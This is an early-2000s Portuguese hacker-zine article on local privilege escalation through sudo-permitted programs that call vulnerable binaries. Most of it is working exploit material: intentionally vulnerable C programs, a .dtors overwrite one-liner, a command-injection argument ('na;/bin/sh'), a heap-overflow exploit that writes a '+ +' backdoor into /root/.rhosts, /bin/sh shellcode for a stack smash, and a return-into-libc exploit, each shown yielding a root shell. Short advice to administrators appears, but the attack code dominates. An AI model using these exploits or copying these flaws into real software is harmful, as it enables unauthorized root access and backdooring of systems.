@@ -1,0 +1,749 @@
+###########################################################################
+############################ UNSEKURITY SCENE #############################
+###########################################################################
+
+Desenvolvido por Nash Leon.
+nashleon@yahoo.com.br
+
+Estes e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://coracaodeleao.virtualave.net/
+
+OBS: Todos os dados e exemplos descritos neste artigo possuem somente
+     propositos educacionais.O Autor nao se responsabiliza pelo mau uso dos
+     dados e exemplos aqui disponibilizados.
+
+OBS2: Elites, pseudo-elites e Analistas de Seguranca sem escrupulos, favor
+      nao ler.Voces nao encontrarao nada de util neste artigo!
+
+
+                        
+                        *******************************
+                        * INNOCENCE E EXPAND OVERFLOW *
+                        *******************************
+
+1 - INTRODUCAO
+2 - ASPECTOS TECNICOS
+    2.1 - Innocence
+    2.2 - Expand Overflow
+3 - ALGUMAS SUGESTOES
+4 - TERMINANDO
+    4.1 - Links e Referencias
+    4.2 - Consideracoes Finais
+
+ 
+---------------
+1 - INTRODUCAO |
+---------------
+
+Resolvi escrever alguns esquemas para ver se desperta um pouco mais a
+criatividade de alguns fucadores.Coloquei o nome das tecnicas porque achei
+que sao especificas, nao se trata de um novo conceito, mas apenas de uma
+abordagem diferenciada de alguns esquemas jah amplamente difundidos.Quero
+mostrar com este artigo que um fucador pode visualizar e contemplar
+esquemas "unicos" em determinados sistemas e expandir o conhecimentos
+sobre uma determinada tecnica para exploitar em outros ambientes.
+
+Conhecimentos basicos de Linux, Buffer Overflows, C sao necessarios.Se
+voce eh elite, pseudo-elite(script kiddie), Analista de Seguranca sem
+escrupulo, favor nao ler.
+
+ 
+---------------------- 
+2 - ASPECTOS TECNICOS |
+----------------------
+
+Neste item, eu pretendo descrever do que se trata essas "abordagens" e os
+conceitos abrangentes que ela pode suscitar, maiores detalhes sobre os
+conceitos serao vistos no proximo item.
+
+----------------
+2.1 - Innocence |
+----------------
+
+Batizo como "Innocence"(Inocencia em portugues) o mau uso de determinados
+programas como o "sudo", por exemplo.
+
+Pra quem nao conhece o sudo, ele eh um programa muito usado em ambientes
+linux que permite que determinados comandos sejam executados como root.O
+conceito abordado por ele eh que atraves de seu uso, os comandos que
+determinados usuarios executarao como root serah limitado e de fato, a
+senha de root nao precisarah ser passada para os usuarios.Com o sudo, os
+usuarios poderao executar determinados comandos sem por em risco a
+"seguranca" de uma rede.Atraves da definicao do arquivo /etc/sudoers, o
+programa executor compara o que o usuario estah querendo executar com o
+arquivo de configuracoes, se ele tiver permissao, ocorre um prompt e em
+seguida, apos a digitacao da senha do usuario, ele executarah o comando.
+
+Vejamos o seguinte arquivo /etc/sudoers inicial:
+
+------------------------- /etc/sudoers ------------------------------
+# sudoers file.
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# See the man page for the details on how to write a sudoers file.
+#
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL) ALL
+nashleon ALL=/bin/ls,/home/glaudson/tecnicas/tecnicaok/innocense/teste
+
+------------------------------------------------------------------------
+
+Vemos que o usuario nashleon tem permissao para executar os comandos
+"ls e teste" como root.Agora veremos o que tem o comando "teste":
+
+------------------------------ teste.c ---------------------------------
+
+/* Teste de expand overflow */
+
+#include <stdio.h>
+#include <unistd.h>
+int executa(char *nome);
+void funcao_executora(void);
+
+main(int argc, char *argv[]){
+if(argc < 2){
+printf("Uso: %s string\n",argv[0]);
+exit(0);
+}
+executa(argv[1]);
+return 0;
+}
+int executa(char *nome){
+execl("./alvo","alvo",nome,NULL);
+return 0;
+}
+---------------------------------------------------------------------
+
+O programa teste acima estah executando outro programa, chamado "./alvo".
+O conteudo de alvo segue especificado abaixo, de modo simples:
+
+-------------------------------- alvo.c -----------------------------
+
+/* Simples Programa vulneravel a overflow */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+
+static void funcao_executora(void);
+
+main(int argc, char *argv[]){
+static u_char buffer[] = "Unsekurity Scene!";
+if(argc < 2) exit(1);
+strcpy(buffer,argv[1]);
+printf("Voce digitou: %s\n",buffer);
+return 0;
+}
+
+void funcao_executora(void){
+        system("/bin/sh");
+}
+
+------------------------------------------------------------------
+
+Podemos ver que alvo acima eh um simples programa vulneravel a overflow.
+Num ambiente em que nem alvo e nem teste sao suid, o sudo serah usado para
+obter privilegios e executar comando arbitrario em cima desses programas.
+Abaixo nos analisaremos esses problemas.
+
+$ ls -l /home/glaudson/tecnicas/tecnicaok/innocense/
+total 48
+-rwxr-xr-x   1 root     root        12052 Apr 27 07:05 alvo*
+-rw-r--r--   1 root     root          398 Apr 27 07:05 alvo.c
+-rw-r--r--   1 root     root          679 Apr 27 06:55 dados.txt
+-rw-r--r--   1 root     root        10532 Apr 27 07:09 tecnicaok.zip
+-rwxr-xr-x   1 root     root        12071 Apr 27 06:57 teste*
+-rw-r--r--   1 root     root          378 Apr 27 06:57 teste.c
+
+Vemos acima que nenhum arquivo eh suid root.Iremos entao tentar exploitar
+o programa teste.
+
+Na unha iremos usar "Exploitacao de dtors" para especificar claramente a
+condicao:
+
+$ objdump -s -j .dtors alvo
+
+alvo:     file format elf32-i386
+
+Contents of section .dtors:
+ 804954c ffffffff 00000000                    ........
+
+Estah em aberto.
+
+$ objdump --syms alvo | grep funcao
+080484b4 l     F .text  00000012              funcao_executora
+
+Pegamos o endereco da funcao_executora e mandamos ver na linha de comando.
+
+$ ls -l /home/glaudson/tecnicas/tecnicaok/innocense/teste
+-rwxr-xr-x   1 root     root        12016 May  4 06:29
+/home/glaudson/tecnicas/tecnicaok/innocense/teste*
+ 
+$ ls -l /home/glaudson/tecnicas/tecnicaok/innocense/alvo
+-rwxr-xr-x   1 root     root        12093 May  4 06:32
+/home/glaudson/tecnicas/tecnicaok/innocense/alvo*
+
+
+Nenhum arquivo suid.Tentaremos elevar a uid usando o sudo como ponte.
+
+$ sudo /home/glaudson/tecnicas/tecnicaok/innocense/teste `perl -e 'print
+"A" x 36; print "\xb4\x84\x04\x08";'`
+Voce Digitou: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+sh-2.03#
+
+Thanks SUDO!:).. Podemos ver que o administrador de rede tende a ser
+"negligente" quando o arquivo nao eh um suid, sgid! Mas esquece que o sudo
+pode ser usado como ponte para obtencao de local root shell.Um atacante
+que obteve shell por alguma das diversas outras tecnicas(Brutal Force,
+local shell com uid desprivilegiada, eng. social e etc) pode verificar o
+mau uso do sudo e tentar atraves desse mau uso obter maiores privilegios.
+
+Recomendacao aos administradores: 
+
+* CHECAR OS PROGRAMAS QUE SERAO USADOS PELO SUDO E ACIMA DE TUDO SEUS 
+HISTORICOS, SE OS MESMOS JAH POSSUEM HISTORICO DE TER INUMEROS BUGS! 
+
+* LIMITAR AO MAXIMO O USO DO SUDO.
+
+
+Pode-se ir mais alem.Podemos contemplar mil e uma condicoes, em especial
+condicoes envolvendo o mau uso de "system()", varias race conditions e
+symbolic links(arquivos xwin).
+
+Inumeras condicoes com system() foram realmente encontradas, de modo que
+veremos abaixo algo para se exploitar system:
+
+------------------------------ alvo2.c ----------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define   ERRO   -1
+
+main(int argc, char *argv[]){
+char comando[40];
+int protecao;
+if(argc < 2){
+printf("Uso: %s <usuario>\n",argv[0]);
+exit(0);
+}
+protecao = strlen(argv[1]);
+if(protecao > 15){
+printf("\nUsuario Inexistente! Ferramenta de IDS logou voce!!\n");
+printf("Ou voce Hackeia o sistema e muda os logs ou tah lascado!!:)\n\n");
+exit(ERRO);
+}
+else{
+sprintf(comando,"w %s",argv[1]);
+system(comando);
+}
+return 0;
+}
+------------------------------------------------------------------------
+
+# gcc -o alvo alvo2.c
+# ls -l alvo
+-rwxr-xr-x   1 root     root        12310 May  4 07:08 alvo*
+ls -l teste
+-rwxr-xr-x   1 root     root        12060 May  4 06:44 teste*
+
+Nenhum arquivo suid! Mas...
+
+
+$ sudo /home/glaudson/tecnicas/tecnicaok/innocense/teste "na;/bin/sh"
+  7:10am  up  1:07,  5 users,  load average: 0.00, 0.02, 0.03
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+sh-2.03#
+
+O SUDO nos dah de presente um local root!:)
+
+----------------------
+2 -   Expand Overflow |
+----------------------
+
+Vimos acima um esquema onde atraves de um programa considerado "sem bugs"
+que chama um programa bugado interagindo com o mesmo, eh possivel
+obtermos privilegios e executarmos comandos.No caso inicial, tinhamos
+um programa vulneravel a overflow, que foi usado para obter maiores
+privilegios atraves do sudo e sobrescrevemos a secao .dtors do mesmo.No 
+entando, esta tecnica eh expansiva.
+
+Veremos no decorrer deste artigo que eh possivel fazermos alguns esquemas
+contra determinados programas bugados, os esquemas podem ser expansiveis
+ao uso do SUDO para elevacao de privilegios, mas o conceito pode ser mais
+abrangente ainda.
+
+
+Comecaremos com o programa vulneravel abaixo:
+
+-------------------------- exp_alvo.c --------------------------------
+  /*
+    * Este eh um tipico programa vulneravel.Ele irah armazenar dados
+    * de entrada(input) em um arquivo temporario.
+    * Desenvolvido por Matt Conover.
+    * Alterado por Nash Leon.
+    * Compile com: gcc -o exp_alvo exp_alvo.c
+    */
+
+   #include <stdio.h>
+   #include <stdlib.h>
+   #include <unistd.h>
+   #include <string.h>
+   #include <errno.h>
+
+  #define BUFSIZE 16
+
+   /*
+    * Rode este vulprog como root para que tenha permissao para escrever
+    * o /root/.rhosts , ou entao adapte-o para o usuario que se encontra.
+    */
+
+   int main(int argc, char **argv)
+   {
+      FILE *tmpfd;
+      static char buf[BUFSIZE], *tmpfile;
+
+      if (argc <= 1)
+      {
+         printf("Uso: %s <lixo>\n", argv[0]);
+         exit(0);
+      }
+
+      tmpfile = "/tmp/vulprog.tmp"; /* Este nao eh o arquivo temporario
+                                        vulneravel. */
+      printf("antes: tmpfile = %s\n", tmpfile);
+      printf("Digite uma linha de dados para colocar em %s: ", tmpfile);
+      gets(buf);
+      printf("\napos: tmpfile = %s\n", tmpfile);
+
+      tmpfd = fopen(tmpfile, "w");
+      if (tmpfd == NULL)
+      {
+         fprintf(stderr, "Erro abrindo %s: %s\n",tmpfile,strerror(errno));
+         exit(1);
+      }
+
+      fputs(buf, tmpfd);
+      fclose(tmpfd);
+   }
+
+-------------------------------------------------------------------------
+
+# gcc -o exp_alvo exp_alvo.c
+/tmp/ccmUiqoi.o: In function `main':
+/tmp/ccmUiqoi.o(.text+0x62): the `gets' function is dangerous and should
+not be used.
+
+Usaremos o seguinte programa teste para nossos intuitos:
+
+--------------------------- teste.c --------------------------------------
+
+/* Teste de expand overflow */
+
+#include <stdio.h>
+#include <unistd.h>
+int executa(char *nome);
+
+main(int argc, char *argv[]){
+if(argc < 2){
+printf("Uso: %s string\n",argv[0]);
+exit(0);
+}
+executa(argv[1]);
+return 0;
+}
+int executa(char *nome){
+execl("/home/glaudson/tecnicas/tecnicaok/innocense/exp_alvo","exp_alvo",nome,NU
+LL);
+return 0;
+}
+
+----------------------------------------------------------------------------
+
+Aparentemente o programa acima estah sem condicoes de exploitacao, mas
+como ele estah executando outro programa, poderemos ver se o outro estah
+bugado, como sabemos no codigo fonte de "exp_alvo", este programa estah
+vulneravel a "HEAP OVERFLOW", logo, iremos tentar umas coisinhas nele.
+(Usaremos ainda o sudo para expandir as possibilidades de interacao entre
+Innocense e Expand Overflow!:)).
+
+------------------------------ expl.c -------------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#define BUFSIZE 256
+
+#define DIFF 16 /* Diferenca estimada entre buf/tmpfile em heapvul1 */
+
+#define SUDO    "/usr/bin/sudo"
+#define VULPROG "/home/glaudson/tecnicas/tecnicaok/innocense/teste"
+#define VULFILE "/root/.rhosts" /* o arquivo 'buf' que serah armazenado */
+
+   u_long getesp()
+   {
+      __asm__("movl %esp,%eax"); /* equiv. de 'return esp;' em C */
+   }
+
+int main(int argc, char **argv)
+   {
+      u_long addr;
+
+      register int i;
+      int mainbufsize;
+
+      char *mainbuf, buf[DIFF+6+1] = "+ +\t# ";
+
+      if (argc <= 1)
+      {
+         fprintf(stderr, "Uso: %s <offset> [tente 310-330]\n", argv[0]);
+         exit(1);
+      }
+      /* ------------------------------------------------------ */
+
+memset(buf, 0, sizeof(buf)), strcpy(buf, "+ +\t# ");
+
+memset(buf + strlen(buf), 'A', DIFF);
+addr = getesp() + atoi(argv[1]);
+/* reverse byte order (em um sistema little endian) */
+
+for (i = 0; i < sizeof(u_long); i++)
+buf[DIFF + i] = ((u_long)addr >> (i * 8) & 255);
+
+mainbufsize = strlen(buf) + strlen(VULPROG) + strlen(VULPROG) + strlen(VULFILE)
+ + 13;
+
+mainbuf = (char *)malloc(mainbufsize);
+memset(mainbuf, 0, sizeof(mainbuf));
+
+snprintf(mainbuf, mainbufsize - 1, "echo '%s' |%s %s %s\n", buf,SUDO,VULPROG, V
+ULFILE);
+
+printf("Sobrescrevendo tmpaddr p/ apontar p/ %p, check %s depois.\n\n",addr, VU
+LFILE);
+
+   system(mainbuf);
+      return 0;
+}
+----------------------------------------------------------------------
+
+Depois eh soh testarmos.
+
+$ gcc -o expl expl.c
+$ ./expl 273
+Sobrescrevendo tmpaddr p/ apontar p/ 0xbffffb01, check /root/.rhosts
+depois.
+
+antes: tmpfile = /tmp/vulprog.tmp
+Digite uma linha de dados para colocar em /tmp/vulprog.tmp:
+apos: tmpfile = /root/.rhosts
+
+Advinha o que tem dentro do /root?:)
+
+# ls -l /root/.rhosts
+-rw-r--r--   1 root     root           22 May  4 07:27 /root/.rhosts
+
+Podemos ir mais alem e testar "Return-into-Libc" para a exploitacao deste
+tipo de bug.Por que estamos usando esta tecnica e nao a simples tecnica de
+"smashing stack"?
+
+Veremos abaixo a tentativa de exploitar usando Smashing Stack:
+
+--------------------------- exp_alvo.c ----------------------------------
+/* Simples programa bugado a overflow */
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[]){
+char buffer[512];
+if(argc < 2){
+printf("Programa bugado!!\n");
+printf("Uso: %s <string>\n",argv[0]);
+exit(0);
+}
+strcpy(buffer,argv[1]);
+printf("Voce digitou %s!!\n",buffer);
+return 0;
+}
+
+------------------------------------------------------------------------
+
+Compilamos o programa acima normalmente, mas como "exp_over", pois o mesmo
+serah chamado pelo "teste" e o sudo tb.
+
+
+------------------------------ expl2.c -----------------------------------
+/* Exploit para especificar problemas quando se usa Smashing Stack em
+ * programas que se interagem. 
+ */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define NOP     0x90
+#define ALIGN      0
+#define SUDO   "/usr/bin/sudo"
+#define ALVO   "/home/glaudson/tecnicas/tecnicaok/innocense/teste"
+#define BUG    "/home/glaudson/tecnicas/tecnicaok/innocense/exp_alvo"
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+int main(int argc, char *argv[])
+{
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+retaddr = pega_sp() - offset;
+
+for (i=0;i<tamanho;i+=4)
+
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+//execl(SUDO,SUDO,ALVO,buffer,0);
+//execl(ALVO,ALVO,buffer,0);
+execl(BUG,BUG,buffer,0);
+}
+
+----------------------------------------------------------------------------
+
+Acima nos temos tres condicoes para execl() e podemos ver que das 3,
+apenas a terceira eh capaz de exploitar, e eh justamente a que nao
+interage os programas, ou seja, a aplicacao eh mesmo simples.
+
+Mas nos podemos ir mais alem, se compilarmos o programa bugado com uma
+shared library, poderemos tentar Return-into-libc nele.Veremos:
+
+# gcc -o teste teste  
+# gcc -o exp_alvo exp_alvo2.c -ldl
+
+Notou algo diferente? apenas o programa vulneravel estah sendo compilado
+com suporte a biblioteca compartilhada, logo, isso pode ser "ocultado" ou
+de dificil percepcao para o administrador.
+
+------------------------------ expl3.c -----------------------------------
+/* Exploit do lamagra para return into libc */
+/*
+ * The exploit
+ * Finds the address of system() in libc.
+ * Searches for "/bin/sh" in the neighbourhood of system().
+ * (System() uses that string)
+ * Lamagra <lamagra@uglypig.org>
+ */
+
+#include <stdlib.h>
+#include <dlfcn.h>
+
+#define  SUDO   "/usr/bin/sudo"
+#define  ALVO   "/home/glaudson/tecnicas/tecnicaok/innocense/teste"
+
+main(int argc, char **argv)
+{
+   int x,size;
+   char *buf;
+   long addr,shell,exitaddy;
+   void *handle;
+
+   if(argc != 2){
+        printf("Uso: %s <bufsize>\n",argv[0]);
+        exit(-1);
+   }
+
+   size = atoi(argv[1])+16;
+   if((buf = malloc(size)) == NULL){
+        perror("can't allocate memory");
+        exit(-1);
+   }
+   handle = dlopen(NULL,RTLD_LAZY);
+
+   addr = (long)dlsym(handle,"system");
+   printf("System() is at 0x%x\n",addr);
+
+   if(!(addr & 0xff) || !(addr & 0xff00) ||
+      !(addr & 0xff0000) || !(addr & 0xff000000))
+   {
+        printf("system() contains a '0', sorry!");
+        exit(-1);
+   }
+
+   shell = addr;
+   while(memcmp((void*)shell,"/bin/sh",8))
+        shell++;
+
+   printf("\"/bin/sh\" is at 0x%x\n",shell);
+   printf("print %s\n",shell);
+   shell = addr;
+   while(memcmp((void*)shell,"/bin/sh",8))
+        shell++;
+
+   printf("\"/bin/sh\" is at 0x%x\n",shell);
+   printf("print %s\n",shell);
+
+   memset(buf,0x41,size);
+   *(long *)&buf[size-16] = 0xbffffbbc;
+   *(long *)&buf[size-12] = addr;
+   *(long *)&buf[size-4]  = shell;
+
+   puts("Executing");
+
+   execl(SUDO,SUDO,ALVO,buf,0x0);
+}
+--------------------------------------------------------------------
+
+Compilamos o programa acima, lembrando de setarmos a biblioteca
+compartilada.
+
+$ gcc -o expl3 expl3.c -ldl
+./expl3 512
+System() is at 0x4005a6f8
+"/bin/sh" is at 0x400f3866
+print /bin/sh
+"/bin/sh" is at 0x400f3866
+print /bin/sh
+Executing
+Voce digitou AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Um monte de As
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¼ûÿ¿ø@AAAAf8@!!
+sh-2.03#
+
+Bingo!! Return-into-Libc exploita perfeitamente programas
+que interagem e como podemos ver, pode ser usado para obter privilegios em
+cima de programas como o SUDO!
+
+----------------------
+3 - ALGUMAS SUGESTOES |
+----------------------
+
+Como vimos a tecnica "Expand Overflow" pode ser expansiva em varios casos:
+
+* Daemons que executam programas locais nao suid que possuem condicoes de
+  exploitacao via overflow.
+
+* Programas suid-root que interagem com programas nao-suid vulneraveis;
+
+* Programas nao-suid que "capturam" variaveis ambientes e repassam a
+  programas suid root.
+
+* Ainda existem outras tecnicas de exploitacao de buffer overflows, como
+  as que usam GOT, Frame Pointer e etc, dependendo da condicao, elas podem
+  sim serem implementadas com sucesso.
+
+Se voce for analisar, essas sugestoes sao bastante vastas e pode ser que
+inumeros sistemas se encontram em condicoes semelhantes e que podem ser
+exploitados.
+
+O SUDO nao deve ser visto como uma solucao efetiva e muito menos como um
+programa de seguranca! Ainda nao achei um artigo explicando os perigos que
+o sudo corre com a "Expand Overflow", tambem nao vih artigos ainda explicando
+algo sobre Expand Overflow, de modo que , pode ser realmente que este
+esquema seja novo e desconhecido por muitos Administradores e Analistas de
+Seguranca!:)
+
+
+---------------
+4 - TERMINANDO |
+---------------
+
+Estes esquemas foram teorizados por mim faz um longo tempo(mais de 1 ano)! 
+Infelizmente a implementacao deles soh foi possivel no inicio desse ano, e 
+eu soh pude contemplar maiores esquemas no inicio de Abril(2001).Existem
+outras tecnicas que tenho "guardadas" na manga e algumas outras que estou
+estudando bem mais interessantes que estas! O que eu quero dizer com isso,
+eh que voce, fucador NewBie, deve correr atras para descobrir seus
+proprios esquemas e contemplar suas teorias e tecnicas! Todos temos
+capacidade para isso, eu recomendo interagir com mais pessoas, deste modo
+a visao de voces irah se expandir mais rapido ainda, qualquer coisa, entre
+em #information de irc.otherside.com.
+
+Muito em breve, estarei repassando mais esquemas na mail list da Unsekurity 
+Scene, e quem frequenta a mail list poderah ver que muito do que foi usado e 
+escrito aqui foi demonstrado lah para "quebrar" uma ferramenta de seguranca 
+que visa defender o sistema contra buffer overflows(spfx2).
+
+4.1 - Links e Referencias
+--------------------------
+
+Projeto Omega:
+http://packetstorm.securify.com/papers/unix/omega.txt
+
+Tutorial de Overflow:
+http://unsekurity.virtualave.net/txts/over.txt
+
+Sobrescrevendo a secao .dtors:
+http://packetstorm.securify.com/groups/synnergy/dtors.txt
+
+Heap Overflows:
+http://www.w00w00.org/files/articles/heaptut.txt
+
+
+4.2 - Consideracoes Finais
+---------------------------
+
+Gostaria de agradecer a todos que fazem parte da Unsekurity Scene, que tem
+contribuido com material e ajudado aos mais novos, sem discriminacao, a
+conhecerem o hacking etico verdadeiro.Se eu fosse citar nomes, essa parte
+seria maior que o texto todo ateh aqui, de modo que, as pessoas sabem a
+quem estou me referindo.
+
+Gostaria de agradecer em especial a MAGIC KISS, por tudo que ela fez e
+toda atencao dada a minha pessoa!
+
+PS: Maio de 2001 e a banda Zero voltou a ativa!!! Viva Zero!!! Viva o
+    Hacking!!!
+
+Um Abraco.
+
+
+                                                      Nash Leon.
+
+--------------------------------- EOF -------------------------------------
+
+
